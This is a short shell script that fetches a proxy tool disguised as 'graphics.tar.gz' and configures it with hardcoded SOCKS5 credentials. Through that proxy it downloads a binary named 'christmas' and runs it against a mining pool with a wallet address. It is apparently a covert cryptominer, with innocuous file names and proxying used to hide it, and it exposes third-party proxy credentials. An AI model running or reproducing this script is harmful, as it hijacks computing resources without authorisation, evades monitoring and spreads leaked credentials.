#!/bin/sh

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.216.28.28:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
chmod +x christmas

./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.Circle -p IhatePopUps
